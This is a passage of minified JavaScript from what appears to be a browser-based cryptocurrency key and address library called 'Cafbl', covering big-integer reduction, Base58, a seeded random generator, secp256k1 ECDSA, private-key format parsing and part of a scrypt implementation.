    return 128 & e[0] ? (e[0] &= 127, h.fromByteArrayUnsigned(e).negate()) : h.fromByteArrayUnsigned(e)
  };
  var S = window.Classic = function(e) {
    this.m = e
  };
  S.prototype.convert = function(e) {
    return 0 > e.s || 0 <= e.compareTo(this.m) ? e.mod(this.m) : e
  }, S.prototype.revert = function(e) {
    return e
  }, S.prototype.reduce = function(e) {
    e.divRemTo(this.m, null, e)
  }, S.prototype.mulTo = function(e, t, o) {
    e.multiplyTo(t, o), this.reduce(o)
  }, S.prototype.sqrTo = function(e, t) {
    e.squareTo(t), this.reduce(t)
  };
  var A = window.Montgomery = function(e) {
    this.m = e, this.mp = e.invDigit(), this.mpl = 32767 & this.mp, this.mph = this.mp >> 15, this.um = (1 << e.DB - 15) - 1, this.mt2 = 2 * e.t
  };
  A.prototype.convert = function(e) {
    var t = s();
    return e.abs().dlShiftTo(this.m.t, t), t.divRemTo(this.m, null, t), 0 > e.s && 0 < t.compareTo(h.ZERO) && this.m.subTo(t, t), t
  }, A.prototype.revert = function(e) {
    var t = s();
    return e.copyTo(t), this.reduce(t), t
  }, A.prototype.reduce = function(e) {
    for (; e.t <= this.mt2;) e[e.t++] = 0;
    for (var t = 0; t < this.m.t; ++t) {
      var o = 32767 & e[t],
        r = o * this.mpl + ((o * this.mph + (e[t] >> 15) * this.mpl & this.um) << 15) & e.DM;
      for (o = t + this.m.t, e[o] += this.m.am(0, r, e, t, 0, this.m.t); e[o] >= e.DV;) e[o] -= e.DV, e[++o]++
    }
    e.clamp(), e.drShiftTo(this.m.t, e), 0 <= e.compareTo(this.m) && e.subTo(this.m, e)
  }, A.prototype.mulTo = function(e, t, o) {
    e.multiplyTo(t, o), this.reduce(o)
  }, A.prototype.sqrTo = function(e, t) {
    e.squareTo(t), this.reduce(t)
  };
  var v = window.NullExp = function() {};
  v.prototype.convert = function(e) {
    return e
  }, v.prototype.revert = function(e) {
    return e
  }, v.prototype.mulTo = function(e, t, o) {
    e.multiplyTo(t, o)
  }, v.prototype.sqrTo = function(e, t) {
    e.squareTo(t)
  };
  var E = window.Barrett = function(e) {
    this.r2 = s(), this.q3 = s(), h.ONE.dlShiftTo(2 * e.t, this.r2), this.mu = this.r2.divide(e), this.m = e
  };
  E.prototype.convert = function(e) {
    if (0 > e.s || e.t > 2 * this.m.t) return e.mod(this.m);
    if (0 > e.compareTo(this.m)) return e;
    var t = s();
    return e.copyTo(t), this.reduce(t), t
  }, E.prototype.revert = function(e) {
    return e
  }, E.prototype.reduce = function(e) {
    for (e.drShiftTo(this.m.t - 1, this.r2), e.t > this.m.t + 1 && (e.t = this.m.t + 1, e.clamp()), this.mu.multiplyUpperTo(this.r2, this.m.t + 1, this.q3), this.m.multiplyLowerTo(this.q3, this.m.t + 1, this.r2); 0 > e.compareTo(this.r2);) e.dAddOffset(1, this.m.t + 1);
    for (e.subTo(this.r2, e); 0 <= e.compareTo(this.m);) e.subTo(this.m, e)
  }, E.prototype.mulTo = function(e, t, o) {
    e.multiplyTo(t, o), this.reduce(o)
  }, E.prototype.sqrTo = function(e, t) {
    e.squareTo(t), this.reduce(t)
  }
}(),
function() {}("object" == typeof module ? module.exports : window.Cafbl = {}),
function(e) {
  e.Base58 = {
    alphabet: "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz",
    validRegex: /^[1-9A-HJ-NP-Za-km-z]+$/,
    base: BigInteger.valueOf(58),
    encode: function(e) {
      for (var o, r = BigInteger.fromByteArrayUnsigned(e), s = []; 0 <= r.compareTo(t.base);) o = r.mod(t.base), s.unshift(t.alphabet[o.intValue()]), r = r.subtract(o).divide(t.base);
      s.unshift(t.alphabet[r.intValue()]);
      for (var n = 0; n < e.length && 0 == e[n]; n++) s.unshift(t.alphabet[0]);
      return s.join("")
    },
    decode: function(e) {
      for (var o, r = BigInteger.valueOf(0), s = 0, n = e.length - 1; 0 <= n; n--) {
        if (o = t.alphabet.indexOf(e[n]), 0 > o) throw "Invalid character";
        r = r.add(BigInteger.valueOf(o).multiply(t.base.pow(e.length - 1 - n))), "1" == e[n] ? s++ : s = 0
      }
      for (var p = r.toByteArrayUnsigned(); 0 < s--;) p.unshift(0);
      return p
    }
  };
  var t = e.Base58
}("undefined" == typeof Cafbl ? module.exports : Cafbl),
function() {
  var e = window.SecureRandom = function() {};
  if (e.state, e.pool, e.pptr, e.poolCopyOnInit, e.poolSize = 256, e.prototype.nextBytes = function(t) {
      var o;
      if (window.crypto && window.crypto.getRandomValues && window.Uint8Array) try {
        var r = new Uint8Array(t.length);
        for (window.crypto.getRandomValues(r), o = 0; o < t.length; ++o) t[o] = e.getByte() ^ r[o];
        return
      } catch (e) {
        alert(e)
      }
      for (o = 0; o < t.length; ++o) t[o] = e.getByte()
    }, e.seedTime = function() {
      e.seedInt(new Date().getTime())
    }, e.getByte = function() {
      if (null == e.state) {
        for (e.seedTime(), e.state = e.ArcFour(), e.state.init(e.pool), e.poolCopyOnInit = [], e.pptr = 0; e.pptr < e.pool.length; ++e.pptr) e.poolCopyOnInit[e.pptr] = e.pool[e.pptr];
        e.pptr = 0
      }
      return e.state.next()
    }, e.seedInt = function(t) {
      e.seedInt8(t), e.seedInt8(t >> 8), e.seedInt8(t >> 16), e.seedInt8(t >> 24)
    }, e.seedInt16 = function(t) {
      e.seedInt8(t), e.seedInt8(t >> 8)
    }, e.seedInt8 = function(t) {
      e.pool[e.pptr++] ^= 255 & t, e.pptr >= e.poolSize && (e.pptr -= e.poolSize)
    }, e.ArcFour = function() {
      function e() {
        this.i = 0, this.j = 0, this.S = []
      }

      function t(e) {
        var o, r, s;
        for (o = 0; 256 > o; ++o) this.S[o] = o;
        for (r = 0, o = 0; 256 > o; ++o) r = 255 & r + this.S[o] + e[o % e.length], s = this.S[o], this.S[o] = this.S[r], this.S[r] = s;
        this.i = 0, this.j = 0
      }

      function o() {
        var e;
        return this.i = 255 & this.i + 1, this.j = 255 & this.j + this.S[this.i], e = this.S[this.i], this.S[this.i] = this.S[this.j], this.S[this.j] = e, this.S[255 & e + this.S[this.i]]
      }
      return e.prototype.init = t, e.prototype.next = o, new e
    }, null == e.pool) {
    e.pool = [], e.pptr = 0;
    var o;
    if (window.crypto && window.crypto.getRandomValues && window.Uint8Array) try {
      var r = new Uint8Array(e.poolSize);
      for (window.crypto.getRandomValues(r), o = 0; o < e.poolSize; ++o) e.pool[e.pptr++] = r[o]
    } catch (e) {
      alert(e)
    }
    for (; e.pptr < e.poolSize;) o = Math.floor(65536 * Math.random()), e.pool[e.pptr++] = o >>> 8, e.pool[e.pptr++] = 255 & o;
    e.pptr = Math.floor(e.poolSize * Math.random()), e.seedTime();
    var s = "";
    s += window.screen.height * window.screen.width * window.screen.colorDepth, s += window.screen.availHeight * window.screen.availWidth * window.screen.pixelDepth;
    var n = new Date,
      p = n.getTimezoneOffset();
    s += p, s += navigator.userAgent;
    for (var a = "", d = 0; d < navigator.plugins.length; d++) a += navigator.plugins[d].name + " " + navigator.plugins[d].filename + " " + navigator.plugins[d].description + " " + navigator.plugins[d].version + ", ";
    for (var l = "", d = 0; d < navigator.mimeTypes.length; d++) l += navigator.mimeTypes[d].description + " " + navigator.mimeTypes[d].type + " " + navigator.mimeTypes[d].suffixes + ", ";
    s += a + l, s += navigator.cookieEnabled + typeof sessionStorage + typeof localStorage, s += navigator.language, s += window.history.length, s += window.location;
    for (var u = Crypto.SHA256(s, {
        asBytes: !0
      }), d = 0; d < u.length; d++) e.seedInt8(u[d])
  }
}(), Cafbl.Address = function(e) {
    "string" == typeof e && (e = Cafbl.Address.decodeString(e)), this.hash = e, this.version = Cafbl.Address.networkVersion
  }, Cafbl.Address.networkVersion = 0, Cafbl.Address.prototype.toString = function() {
    var e = this.hash.slice(0);
    e.unshift(this.version);
    var t = Crypto.SHA256(Crypto.SHA256(e, {
        asBytes: !0
      }), {
        asBytes: !0
      }),
      o = e.concat(t.slice(0, 4));
    return Cafbl.Base58.encode(o)
  }, Cafbl.Address.prototype.getHashBase64 = function() {
    return Crypto.util.bytesToBase64(this.hash)
  }, Cafbl.Address.decodeString = function(e) {
    var t = Cafbl.Base58.decode(e),
      o = t.slice(0, 21),
      i = Crypto.SHA256(Crypto.SHA256(o, {
        asBytes: !0
      }), {
        asBytes: !0
      });
    if (i[0] != t[21] || i[1] != t[22] || i[2] != t[23] || i[3] != t[24]) throw "Checksum validation failed!";
    var r = o.shift();
    if (0 != r) throw "Version " + r + " not supported!";
    return o
  }, Cafbl.ECDSA = function() {
    function t(e, t, o, r) {
      for (var s = Math.max(t.bitLength(), r.bitLength()), n = e.add2D(o), p = e.curve.getInfinity(), a = s - 1; 0 <= a; --a) p = p.twice2D(), p.z = BigInteger.ONE, t.testBit(a) ? p = p.add2D(r.testBit(a) ? n : e) : r.testBit(a) && (p = p.add2D(o));
      return p
    }
    var l = EllipticCurve.getSECCurveByName("secp256k1"),
      e = new SecureRandom,
      o = null,
      u = {
        getBigRandom: function(t) {
          return new BigInteger(t.bitLength(), e).mod(t.subtract(BigInteger.ONE)).add(BigInteger.ONE)
        },
        sign: function(t, o) {
          var i = l.getN(),
            n = BigInteger.fromByteArrayUnsigned(t);
          do var e = u.getBigRandom(i),
            p = l.getG(),
            a = p.multiply(e),
            d = a.getX().toBigInteger().mod(i); while (0 >= d.compareTo(BigInteger.ZERO));
          var r = e.modInverse(i).multiply(n.add(o.multiply(d))).mod(i);
          return u.serializeSig(d, r)
        },
        verify: function(t, o, i) {
          var n, p;
          if (Cafbl.Util.isArray(o)) {
            var a = u.parseSig(o);
            n = a.r, p = a.s
          } else {
            if ("object" != typeof o || !o.r || !o.s) throw "Invalid value for signature";
            n = o.r, p = o.s
          }
          var d;
          if (i instanceof ec.PointFp) d = i;
          else {
            if (!Cafbl.Util.isArray(i)) throw "Invalid format for pubkey value, must be byte array or ec.PointFp";
            d = EllipticCurve.PointFp.decodeFrom(l.getCurve(), i)
          }
          var y = BigInteger.fromByteArrayUnsigned(t);
          return u.verifyRaw(y, n, p, d)
        },
        verifyRaw: function(t, e, i, r) {
          var o = l.getN(),
            s = l.getG();
          if (0 > e.compareTo(BigInteger.ONE) || 0 <= e.compareTo(o)) return !1;
          if (0 > i.compareTo(BigInteger.ONE) || 0 <= i.compareTo(o)) return !1;
          var n = i.modInverse(o),
            p = t.multiply(n).mod(o),
            a = e.multiply(n).mod(o),
            d = s.multiply(p).add(r.multiply(a)),
            u = d.getX().toBigInteger().mod(o);
          return u.equals(e)
        },
        serializeSig: function(e, t) {
          var i = e.toByteArraySigned(),
            o = t.toByteArraySigned(),
            r = [];
          return r.push(2), r.push(i.length), r = r.concat(i), r.push(2), r.push(o.length), r = r.concat(o), r.unshift(r.length), r.unshift(48), r
        },
        parseSig: function(e) {
          var t;
          if (48 != e[0]) throw new Error("Signature not a valid DERSequence");
          if (t = 2, 2 != e[t]) throw new Error("First element in signature must be a DERInteger");
          var o = e.slice(t + 2, t + 2 + e[t + 1]);
          if (t += 2 + e[t + 1], 2 != e[t]) throw new Error("Second element in signature must be a DERInteger");
          var i = e.slice(t + 2, t + 2 + e[t + 1]);
          t += 2 + e[t + 1];
          var n = BigInteger.fromByteArrayUnsigned(o),
            r = BigInteger.fromByteArrayUnsigned(i);
          return {
            r: n,
            s: r
          }
        },
        parseSigCompact: function(e) {
          if (65 !== e.length) throw "Signature has the wrong length";
          var t = e[0] - 27;
          if (0 > t || 7 < t) throw "Invalid signature type";
          var o = l.getN(),
            i = BigInteger.fromByteArrayUnsigned(e.slice(1, 33)).mod(o),
            r = BigInteger.fromByteArrayUnsigned(e.slice(33, 65)).mod(o);
          return {
            r: i,
            s: r,
            i: t
          }
        },
        recoverPubKey: function(d, r, s, y) {
          y = 3 & y;
          var c = 1 & y,
            m = y >> 1,
            g = l.getN(),
            n = l.getG(),
            f = l.getCurve(),
            h = f.getQ(),
            p = f.getA().toBigInteger(),
            a = f.getB().toBigInteger();
          o || (o = h.add(BigInteger.ONE).divide(BigInteger.valueOf(4)));
          var b = m ? d.add(g) : d,
            B = b.multiply(b).multiply(b).add(p.multiply(b)).add(a).mod(h),
            F = B.modPow(o, h),
            T = (F.isEven() ? y % 2 : (y + 1) % 2, (F.isEven() ? !c : c) ? F : h.subtract(F)),
            v = new EllipticCurve.PointFp(f, f.fromBigInteger(b), f.fromBigInteger(T));
          v.validate();
          var S = BigInteger.fromByteArrayUnsigned(s),
            e = BigInteger.ZERO.subtract(S).mod(g),
            C = d.modInverse(g),
            A = t(v, r, n, e).multiply(C);
          if (A.validate(), !u.verifyRaw(S, d, r, A)) throw "Pubkey recovery unsuccessful";
          var E = new Cafbl.ECKey;
          return E.pub = A, E
        },
        calcPubkeyRecoveryParam: function(e, t, o, r) {
          for (var s = 0; 4 > s; s++) try {
            var n = Cafbl.ECDSA.recoverPubKey(t, o, r, s);
            if (n.getCafblAddress().toString() == e) return s
          } catch (e) {}
          throw "Unable to find valid recovery factor"
        }
      };
    return u
  }(), Cafbl.KeyPool = function() {
    return new function() {
      return this.keyArray = [], this.push = function(e) {
        if (null != e && null != e.priv) {
          var t = !0;
          for (var o in this.keyArray) {
            var i = this.keyArray[o];
            if (null != i && null != i.priv && e.getCafblAddress() == i.getCafblAddress()) {
              t = !1;
              break
            }
          }
          t && this.keyArray.push(e)
        }
      }, this.reset = function() {
        this.keyArray = []
      }, this.getArray = function() {
        return this.keyArray.slice(0)
      }, this.setArray = function(e) {
        this.keyArray = e
      }, this.length = function() {
        return this.keyArray.length
      }, this.toString = function() {
        var e = "# = " + this.length() + "\n",
          t = this.getArray();
        for (var i in t) {
          var r = t[i];
          Cafbl.Util.hasMethods(r, "getCafblAddress", "toString") && null != r && (e += "\"" + r.getCafblAddress() + "\", \"" + r.toString("wif") + "\"\n")
        }
        return e
      }, this
    }
  }(), Cafbl.Bip38Key = function() {
    var e = function(e, t) {
      this.address = e, this.priv = t
    };
    return e.prototype.getCafblAddress = function() {
      return this.address
    }, e.prototype.toString = function() {
      return this.priv
    }, e
  }(), Cafbl.ECKey = function() {
    var e = Cafbl.ECDSA,
      t = Cafbl.KeyPool,
      i = EllipticCurve.getSECCurveByName("secp256k1"),
      r = function(o) {
        if (!o) {
          var s = i.getN();
          this.priv = e.getBigRandom(s)
        } else if (o instanceof BigInteger) this.priv = o;
        else if (Cafbl.Util.isArray(o)) this.priv = BigInteger.fromByteArrayUnsigned(o);
        else if ("string" == typeof o) {
          var n = null;
          try {
            r.isWalletImportFormat(o) ? n = r.decodeWalletImportFormat(o) : r.isCompressedWalletImportFormat(o) ? (n = r.decodeCompressedWalletImportFormat(o), this.compressed = !0) : r.isMiniFormat(o) ? n = Crypto.SHA256(o, {
              asBytes: !0
            }) : r.isHexFormat(o) ? n = Crypto.util.hexToBytes(o) : r.isBase64Format(o) && (n = Crypto.util.base64ToBytes(o))
          } catch (e) {
            this.setError(e)
          }
          this.priv = r.isBase6Format(o) ? new BigInteger(o, 6) : null == n || 32 != n.length ? null : BigInteger.fromByteArrayUnsigned(n)
        }
        this.compressed = null == this.compressed ? !!r.compressByDefault : this.compressed;
        try {
          null != this.priv && 0 == BigInteger.ZERO.compareTo(this.priv) && this.setError("Error: BigInteger equal to zero.");
          var p = Crypto.util.hexToBytes("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364140"),
            a = BigInteger.fromByteArrayUnsigned(p);
          null != this.priv && 0 > a.compareTo(this.priv) && this.setError("Error: BigInteger outside of curve range."), null != this.priv && t.push(this)
        } catch (e) {
          this.setError(e)
        }
      };
    return r.privateKeyPrefix = 128, r.compressByDefault = !1, r.prototype.setError = function(e) {
      return this.error = e, this.priv = null, this
    }, r.prototype.setCompressed = function(e) {
      return this.compressed = !!e, this.pubPoint && (this.pubPoint.compressed = this.compressed), this
    }, r.prototype.getPub = function() {
      return this.compressed ? this.pubComp ? this.pubComp : this.pubComp = this.getPubPoint().getEncoded(1) : this.pubUncomp ? this.pubUncomp : this.pubUncomp = this.getPubPoint().getEncoded(0)
    }, r.prototype.getPubPoint = function() {
      return this.pubPoint || (this.pubPoint = i.getG().multiply(this.priv), this.pubPoint.compressed = this.compressed), this.pubPoint
    }, r.prototype.getPubKeyHex = function() {
      return this.compressed ? this.pubKeyHexComp ? this.pubKeyHexComp : this.pubKeyHexComp = Crypto.util.bytesToHex(this.getPub()).toString().toUpperCase() : this.pubKeyHexUncomp ? this.pubKeyHexUncomp : this.pubKeyHexUncomp = Crypto.util.bytesToHex(this.getPub()).toString().toUpperCase()
    }, r.prototype.getPubKeyHash = function() {
      return this.compressed ? this.pubKeyHashComp ? this.pubKeyHashComp : this.pubKeyHashComp = Cafbl.Util.sha256ripe160(this.getPub()) : this.pubKeyHashUncomp ? this.pubKeyHashUncomp : this.pubKeyHashUncomp = Cafbl.Util.sha256ripe160(this.getPub())
    }, r.prototype.getCafblAddress = function() {
      var e = this.getPubKeyHash(),
        t = new Cafbl.Address(e);
      return t.toString()
    }, r.prototype.setPub = function(e) {
      Cafbl.Util.isArray(e) && (e = Crypto.util.bytesToHex(e).toString().toUpperCase());
      var t = i.getCurve().decodePointHex(e);
      return this.setCompressed(t.compressed), this.pubPoint = t, this
    }, r.prototype.getCafblWalletImportFormat = function() {
      var e = this.getCafblPrivateKeyByteArray();
      if (null == e) return "";
      e.unshift(r.privateKeyPrefix), this.compressed && e.push(1);
      var t = Crypto.SHA256(Crypto.SHA256(e, {
        asBytes: !0
      }), {
        asBytes: !0
      });
      e = e.concat(t.slice(0, 4));
      var i = Cafbl.Base58.encode(e);
      return i
    }, r.prototype.getCafblHexFormat = function() {
      return Crypto.util.bytesToHex(this.getCafblPrivateKeyByteArray()).toString().toUpperCase()
    }, r.prototype.getCafblBase64Format = function() {
      return Crypto.util.bytesToBase64(this.getCafblPrivateKeyByteArray())
    }, r.prototype.getCafblPrivateKeyByteArray = function() {
      if (null == this.priv) return null;
      for (var e = this.priv.toByteArrayUnsigned(); 32 > e.length;) e.unshift(0);
      return e
    }, r.prototype.toString = function(e) {
      return e = e || "", "base64" == e.toString().toLowerCase() || "b64" == e.toString().toLowerCase() ? this.getCafblBase64Format() : "wif" == e.toString().toLowerCase() ? this.getCafblWalletImportFormat() : this.getCafblHexFormat()
    }, r.prototype.sign = function(t) {
      return e.sign(t, this.priv)
    }, r.prototype.verify = function(t, o) {
      return e.verify(t, o, this.getPub())
    }, r.decodeWalletImportFormat = function(e) {
      var t = Cafbl.Base58.decode(e),
        o = t.slice(0, 33),
        i = Crypto.SHA256(Crypto.SHA256(o, {
          asBytes: !0
        }), {
          asBytes: !0
        });
      if (i[0] != t[33] || i[1] != t[34] || i[2] != t[35] || i[3] != t[36]) throw "Checksum validation failed!";
      var s = o.shift();
      if (s != r.privateKeyPrefix) throw "Version " + s + " not supported!";
      return o
    }, r.decodeCompressedWalletImportFormat = function(e) {
      var t = Cafbl.Base58.decode(e),
        o = t.slice(0, 34),
        i = Crypto.SHA256(Crypto.SHA256(o, {
          asBytes: !0
        }), {
          asBytes: !0
        });
      if (i[0] != t[34] || i[1] != t[35] || i[2] != t[36] || i[3] != t[37]) throw "Checksum validation failed!";
      var s = o.shift();
      if (s != r.privateKeyPrefix) throw "Version " + s + " not supported!";
      return o.pop(), o
    }, r.isHexFormat = function(e) {
      return e = e.toString(), /^[A-Fa-f0-9]{64}$/.test(e)
    }, r.isWalletImportFormat = function(e) {
      return e = e.toString(), 128 == r.privateKeyPrefix ? /^5[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{50}$/.test(e) : /^9[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{50}$/.test(e)
    }, r.isCompressedWalletImportFormat = function(e) {
      return e = e.toString(), 128 == r.privateKeyPrefix ? /^[LK][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{51}$/.test(e) : /^c[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{51}$/.test(e)
    }, r.isBase64Format = function(e) {
      return e = e.toString(), /^[ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789=+\/]{44}$/.test(e)
    }, r.isBase6Format = function(e) {
      return e = e.toString(), /^[012345]{99}$/.test(e)
    }, r.isMiniFormat = function(e) {
      e = e.toString();
      var t = /^S[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{21}$/.test(e),
        i = /^S[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{25}$/.test(e),
        r = /^S[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{29}$/.test(e),
        s = Crypto.SHA256(e + "?", {
          asBytes: !0
        });
      return (0 === s[0] || 1 === s[0]) && (t || i || r)
    }, r
  }(), Cafbl.Util = {
    isArray: Array.isArray || function(e) {
      return "[object Array]" === Object.prototype.toString.call(e)
    },
    makeFilledArray: function(e, t) {
      for (var o = [], r = 0; e > r;) o[r++] = t;
      return o
    },
    numToVarInt: function(e) {
      return 253 > e ? [e] : 65536 >= e ? [253, e >>> 8, 255 & e] : 1 >= e ? [254].concat(Crypto.util.wordsToBytes([e])) : [255].concat(Crypto.util.wordsToBytes([e >>> 32, e]))
    },
    valueToBigInt: function(e) {
      return e instanceof BigInteger ? e : BigInteger.fromByteArrayUnsigned(e)
    },
    formatValue: function(e) {
      for (var t = this.valueToBigInt(e).toString(), o = 8 < t.length ? t.substr(0, t.length - 8) : "0", i = 8 < t.length ? t.substr(t.length - 8) : t; 8 > i.length;) i = "0" + i;
      for (i = i.replace(/0*$/, ""); 2 > i.length;) i += "0";
      return o + "." + i
    },
    parseValue: function(e) {
      for (var t = e.split("."), o = t[0], i = t[1] || "0"; 8 > i.length;) i += "0";
      i = i.replace(/^0+/g, "");
      var r = BigInteger.valueOf(parseInt(o));
      return r = r.multiply(BigInteger.valueOf(1e8)), r = r.add(BigInteger.valueOf(parseInt(i)))
    },
    sha256ripe160: function(e) {
      return Crypto.RIPEMD160(Crypto.SHA256(e, {
        asBytes: !0
      }), {
        asBytes: !0
      })
    },
    dsha256: function(e) {
      return Crypto.SHA256(Crypto.SHA256(e, {
        asBytes: !0
      }), {
        asBytes: !0
      })
    },
    hasMethods: function(e) {
      for (var t, o = 1; t = arguments[o++];)
        if ("function" != typeof e[t]) return !1;
      return !0
    }
  },
  function() {
    var e = null;
    window.Crypto_scrypt = function(t, o, s, n, r, p, a) {
      function l() {
        function e(e, s, n, r, p, a) {
          var d, u = 128 * n;
          for (m(e, s, a, 0, u), d = 0; r > d; d++) m(a, 0, p, d * u, u), t(a, 0, u, n);
          for (d = 0; r > d; d++) {
            var y = o(a, 0, n) & r - 1;
            l(p, y * u, a, 0, u), t(a, 0, u, n)
          }
          m(a, 0, e, s, u)
        }

        function t(e, t, o, s) {
          var r, n = [];
          for (m(e, t + 64 * (2 * s - 1), n, 0, 64), r = 0; 2 * s > r; r++) l(e, 64 * r, n, 0, 64), a(n), m(n, 0, e, o + 64 * r, 64);
          for (r = 0; s > r; r++) m(e, o + 64 * (2 * r), e, t + 64 * r, 64);
          for (r = 0; s > r; r++) m(e, o + 64 * (2 * r + 1), e, t + 64 * (r + s), 64)
        }

        function p(e, t) {
          return e << t | e >>> 32 - t
        }

        function a(e) {
          var t, r = Array(32),
            o = Array(32);
          for (t = 0; 16 > t; t++) r[t] = (255 & e[4 * t + 0]) << 0, r[t] |= (255 & e[4 * t + 1]) << 8, r[t] |= (255 & e[4 * t + 2]) << 16, r[t] |= (255 & e[4 * t + 3]) << 24;
          for (d(r, 0, o, 0, 16), t = 8; 0 < t; t -= 2) o[4] ^= p(o[0] + o[12], 7), o[8] ^= p(o[4] + o[0], 9), o[12] ^= p(o[8] + o[4], 13), o[0] ^= p(o[12] + o[8], 18), o[9] ^= p(o[5] + o[1], 7), o[13] ^= p(o[9] + o[5], 9), o[1] ^= p(o[13] + o[9], 13), o[5] ^= p(o[1] + o[13], 18), o[14] ^= p(o[10] + o[6], 7), o[2] ^= p(o[14] + o[10], 9), o[6] ^= p(o[2] + o[14], 13), o[10] ^= p(o[6] + o[2], 18), o[3] ^= p(o[15] + o[11], 7), o[7] ^= p(o[3] + o[15], 9), o[11] ^= p(o[7] + o[3], 13), o[15] ^= p(o[11] + o[7], 18), o[1] ^= p(o[0] + o[3], 7), o[2] ^= p(o[1] + o[0], 9), o[3] ^= p(o[2] + o[1], 13), o[0] ^= p(o[3] + o[2], 18), o[6] ^= p(o[5] + o[4], 7), o[7] ^= p(o[6] + o[5], 9), o[4] ^= p(o[7] + o[6], 13), o[5] ^= p(o[4] + o[7], 18), o[11] ^= p(o[10] + o[9], 7), o[8] ^= p(o[11] + o[10], 9), o[9] ^= p(o[8] + o[11], 13), o[10] ^= p(o[9] + o[8], 18), o[12] ^= p(o[15] + o[14], 7), o[13] ^= p(o[12] + o[15], 9), o[14] ^= p(o[13] + o[12], 13), o[15] ^= p(o[14] + o[13], 18);
          for (t = 0; 16 > t; ++t) r[t] = o[t] + r[t];
          for (t = 0; 16 > t; t++) {
            var s = 4 * t;
            e[s + 0] = 255 & r[t] >> 0, e[s + 1] = 255 & r[t] >> 8, e[s + 2] = 255 & r[t] >> 16, e[s + 3] = 255 & r[t] >> 24
          }
        }

        function l(e, t, o, r, s) {
          for (var n = s >> 6; n--;) o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++]
        }

        function o(e, t, i) {
          var r;
          return t += 64 * (2 * i - 1), r = (255 & e[t + 0]) << 0, r |= (255 & e[t + 1]) << 8, r |= (255 & e[t + 2]) << 16, r |= (255 & e[t + 3]) << 24
        }

        function d(e, t, o, i, r) {
          for (; r--;) o[i++] = e[t++]
        }

        function m(e, t, o, r, s) {
          for (var n = s >> 5; n--;) o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++]
        }
        var g = [],
          h = [];
        if ("undefined" == typeof c) onmessage = function(t) {
          var o = t.data,
            s = o[0],
            n = o[1],
            r = (o[2], o[3]),
            p = o[4],
            i = [];
          m(r, 128 * p * n, i, 0, 128 * n), e(i, 0, n, s, h, g), postMessage([p, i])
        };
        else
          for (var u = 0; r > u; u++) e(c, 128 * u * n, n, s, h, g)
      }
      if (0 == s || 0 != (s & s - 1)) throw Error("N must be > 0 and a power of 2");
      if (s > 2147483647 / 128 / n) throw Error("Parameter N is too large");
      if (n > 2147483647 / 128 / r) throw Error("Parameter r is too large");
      var y = {
          iterations: 1,
          hasher: Crypto.SHA256,
          asBytes: !0
        },
        c = Crypto.PBKDF2(t, o, 128 * r * n, y);
      try {
        var m = 0,
          g = 0,
          d = function() {
            if (!e) {
              var i, u = "(" + l.toString() + ")()";
              try {
                i = new Blob([u], {
                  type: "text/javascript"
                })
              } catch (e) {
                window.BlobBuilder = window.BlobBuilder || window.WebKitBlobBuilder || window.MozBlobBuilder || window.MSBlobBuilder, i = new BlobBuilder, i.append(u), i = i.getBlob("text/javascript")
              }
              e = URL.createObjectURL(i)
            }
            var f = new Worker(e);
            return f.onmessage = function(e) {
              var o = e.data[0],
                i = e.data[1];
              g++, r > m && f.postMessage([s, n, r, c, m++]);
              for (var d = i.length, l = 128 * o * n, u = 0; d--;) c[l++] = i[u++];
              g == r && a(Crypto.PBKDF2(t, c, p, y))
            }, f
          },
          u = [d(), d()];
